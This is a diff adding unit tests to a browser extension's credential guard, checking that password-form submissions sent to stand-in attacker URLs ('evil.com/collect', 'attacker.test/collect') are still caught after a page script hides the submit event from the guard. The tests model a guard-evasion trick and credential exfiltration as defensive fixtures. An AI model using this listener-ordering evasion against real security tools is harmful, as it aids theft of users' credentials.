@@ -1,6 +1,21 @@
 // @vitest-environment happy-dom
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
+// #1113: happy-dom has no Navigation API. Install a stub before the guard loads,
+// and record the guard's window submit listener so a test can put a page
+// listener ahead of it, as document.open() plus a written script does.
+const nav = vi.hoisted(() => {
+  const navigation = new EventTarget();
+  (window as unknown as { navigation: EventTarget }).navigation = navigation;
+  const guardSubmit: EventListener[] = [];
+  const original = window.addEventListener;
+  window.addEventListener = ((type: string, listener: EventListener, options?: boolean) => {
+    if (type === "submit") guardSubmit.push(listener);
+    original.call(window, type, listener, options);
+  }) as typeof window.addEventListener;
+  return { navigation, guardSubmit, restore: () => { window.addEventListener = original; } };
+});
+
 vi.mock("../extension/src/shared/storage", () => ({
   getCredentialSettings: vi.fn(),
   getTrustedDomains: vi.fn(),
@@ -211,6 +226,7 @@ function defaultConfig() {
 
 // Import module under test — registers event listeners on document
 import "../extension/src/content/credential_guard";
+nav.restore();
 
 // The guard registers a settings-change subscription at module load to keep its
 // synchronous credential-mode cache fresh (#227.5). Capture that callback now
@@ -2073,6 +2089,83 @@ describe("credential_guard", () => {
 
       expect(stopSpy).toHaveBeenCalledTimes(1);
       expect(mockShowModal).toHaveBeenCalledTimes(2);
+    });
+
+    // #1113: after document.open(), a written script's window capture listener is
+    // added before the guard is re-added and can stop the submit unseen. The guard's
+    // Navigation API listener is not erased, so it still runs first.
+    describe("navigate backstop (#1113)", () => {
+      function navigate(sourceElement: Element, url: string, userInitiated: boolean): Event {
+        const ev = new Event("navigate", { cancelable: true });
+        Object.defineProperties(ev, {
+          sourceElement: { value: sourceElement },
+          userInitiated: { value: userInitiated },
+          destination: { value: { url } },
+        });
+        nav.navigation.dispatchEvent(ev);
+        return ev;
+      }
+
+      it("assesses a user submit that a page capture listener stopped ahead of the guard", async () => {
+        const { form, btn } = formWithButton();
+        btn.setAttribute("formaction", "https://evil.com/collect");
+        const [guard] = nav.guardSubmit;
+        const hide = (e: Event): void => e.stopImmediatePropagation();
+        // document.open() erases the guard; the written script adds `hide`; the guard is re-added behind it.
+        window.removeEventListener("submit", guard!, true);
+        window.addEventListener("submit", hide, true);
+        window.addEventListener("submit", guard!, true);
+        try {
+          const submit = await dispatchSubmit(form, btn);
+          expect(submit.defaultPrevented).toBe(false); // the guard never saw it
+          expect(mockShowModal).not.toHaveBeenCalled();
+
+          const ev = navigate(btn, "https://evil.com/collect", true);
+          await flushMicrotasks();
+
+          expect(ev.defaultPrevented).toBe(true);
+          expect(mockComputeRisk).toHaveBeenCalledWith(expect.objectContaining({ actionUrl: "https://evil.com/collect" }));
+          expect(mockShowModal).toHaveBeenCalledTimes(1);
+        } finally {
+          window.removeEventListener("submit", hide, true);
+        }
+      });
+
+      it("lets a resumed submission keep its approved destination", async () => {
+        mockShowModal.mockResolvedValue("proceed_once");
+        const { form, btn } = formWithButton();
+        await dispatchSubmit(form, btn);
+
+        const ev = navigate(btn, "https://example.com/session", false);
+        await flushMicrotasks();
+
+        expect(ev.defaultPrevented).toBe(false);
+        expect(mockShowModal).toHaveBeenCalledTimes(1);
+      });
+
+      it("cancels and re-assesses a resumed submission whose destination moved unseen", async () => {
+        mockShowModal.mockResolvedValueOnce("proceed_once").mockResolvedValueOnce("cancel");
+        const { form, btn } = formWithButton();
+        await dispatchSubmit(form, btn);
+        btn.setAttribute("formaction", "https://attacker.test/collect");
+
+        const ev = navigate(btn, "https://attacker.test/collect", false);
+        await flushMicrotasks();
+
+        expect(ev.defaultPrevented).toBe(true);
+        expect(mockShowModal).toHaveBeenCalledTimes(2);
+      });
+
+      it("ignores script navigations it never resumed, forms without a password, and the off mode", async () => {
+        const { btn } = formWithButton();
+        const plain = createPlainForm();
+        expect(navigate(btn, "https://example.com/session", false).defaultPrevented).toBe(false);
+        expect(navigate(plain, "https://evil.com/collect", true).defaultPrevented).toBe(false);
+        setCachedCredMode("off");
+        expect(navigate(btn, "https://evil.com/collect", true).defaultPrevented).toBe(false);
+        await flushMicrotasks();
+        expect(mockShowModal).not.toHaveBeenCalled();
+      });
     });
   });
 });
